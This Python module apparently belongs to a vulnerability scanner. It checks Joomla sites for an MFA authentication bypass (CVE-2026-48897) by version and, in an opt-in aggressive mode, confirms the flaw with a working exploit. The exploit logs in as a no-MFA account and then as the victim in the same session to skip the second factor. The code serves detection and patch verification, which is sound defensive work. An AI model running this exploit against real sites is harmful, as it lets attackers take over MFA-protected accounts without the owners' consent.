from __future__ import annotations

import re
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from . import gridbox_common as gb

CVE_ID = "CVE-2026-48897"
NAME = "Joomla core MFA bypass through a stale session state"
COMPONENT = "Joomla core com_users MFA"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["4.0.0-5.4.5", "6.0.0-6.1.0"]
AFFECTED_RULE = "Joomla 4.0.0-5.4.5 and 6.0.0-6.1.0; requires the victim password plus any no-MFA account"
FIXED_RULE = "Update to Joomla 5.4.6, 6.1.1, or newer"
LOGIN_PAGE = "/index.php/component/users/login?Itemid=101"
PROFILE_EDIT = "/index.php?option=com_users&view=profile&layout=edit"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("4.0.0") <= parsed < parse_version_required("5.4.6"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.1"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("4.0.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def passive_result(joomla_version: str | None) -> Finding:
    status = classify_version(joomla_version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED", "NOT_AFFECTED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Joomla {joomla_version} does not reset com_users.mfa_checked on a new login; "
            "verify the stale-flag bypass with a no-MFA account and the MFA victim."
        ),
        "PATCHED": f"Joomla {joomla_version} resets com_users.mfa_checked on every login.",
        "NOT_AFFECTED": f"Joomla {joomla_version} predates the affected MFA handler.",
        "INCONCLUSIVE": "Joomla was detected, but the core version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=joomla_version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade to Joomla 5.4.6, 6.1.1, or newer and review MFA-protected account logins.",
    )


def _token(page: str) -> str | None:
    match = re.search(r'name="([a-f0-9]{32})" value="1"', page)
    if match:
        return match.group(1)
    match = re.search(r'"csrf\.token":"([a-f0-9]{32})"', page)
    return match.group(1) if match else None


def _login(client: HttpClient, base: str, user: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}{LOGIN_PAGE}", timeout=timeout)
    token = _token(page.get("body", "") or "")
    if not token:
        return False
    client.request(
        f"{base}/index.php?option=com_users&task=user.login",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "username": user,
            "password": password,
            "remember": "0",
            "return": "",
            token: "1",
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    return True


def _second_login(client: HttpClient, base: str, user: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}/index.php", timeout=timeout)
    token = _token(page.get("body", "") or "")
    if not token:
        return False
    client.request(
        f"{base}/index.php?option=com_users&task=user.login",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "username": user,
            "password": password,
            "remember": "0",
            "return": "",
            token: "1",
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    return True


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    victim_user: str | None = None,
    victim_password: str | None = None,
    plain_user: str | None = None,
    plain_password: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not all((victim_user, victim_password, plain_user, plain_password)):
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail=(
                "The probe needs the MFA victim and a no-MFA account via --aggressive-arg "
                "victim_user=... victim_password=... plain_user=... plain_password=...; nothing was sent."
            ),
            action="Re-run with lab credentials on an authorized target.",
        )
    assert victim_user is not None and victim_password is not None
    assert plain_user is not None and plain_password is not None
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    if not _login(client, base, plain_user, plain_password, timeout):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail="The frontend login form was not available for the no-MFA account.",
            action="Verify the frontend login route and credentials.",
        )
    plain_identity = gb.profile_identity(client, base, timeout)
    if plain_identity != plain_user:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail=(
                f"The no-MFA account did not establish a session (identity={plain_identity!r}); "
                "the stale flag could not be primed."
            ),
            action="Verify the no-MFA account can log in on the frontend.",
        )
    if not _second_login(client, base, victim_user, victim_password, timeout):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail="No CSRF token was available for the second login.",
            action="Verify the site is reachable and the session is valid.",
        )
    profile = client.get(f"{base}{PROFILE_EDIT}", timeout=timeout)
    body = profile.get("body", "") or ""
    final_url = str(profile.get("final_url") or "")
    identity = gb.profile_identity(client, base, timeout)
    captive = "captive" in final_url.lower() or "view=captive" in body
    evidence: dict[str, object] = {
        "plain_identity": plain_identity,
        "victim_user": victim_user,
        "second_login_identity": identity,
        "final_url": final_url,
        "captive_gate": captive,
    }
    if identity == victim_user and not captive:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{PROFILE_EDIT}",
            evidence=evidence,
            detail=(
                f"A first login as the no-MFA account {plain_user} set com_users.mfa_checked=1. "
                f"The second login in the same session authenticated {victim_user} (whose TOTP was never "
                "submitted) and the profile edit page loaded without the captive MFA redirect."
            ),
            action=(
                "Upgrade to Joomla 5.4.6, 6.1.1, or newer (the login now resets the MFA state); "
                "review MFA-protected accounts for logins without a second factor."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{PROFILE_EDIT}",
        evidence=evidence,
        detail=(
            "The second login did not reach the victim profile without MFA "
            f"(identity={identity!r}, captive={captive})."
        ),
        action="Verify Joomla runs 5.4.6, 6.1.1, or newer.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only stale-state MFA proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        victim_user=args.get("victim_user"),
        victim_password=args.get("victim_password"),
        plain_user=args.get("plain_user"),
        plain_password=args.get("plain_password"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-48897",
            "https://developer.joomla.org/security-centre/1044-20260512-core-mfa-authentication-bypass.html",
        ],
    }
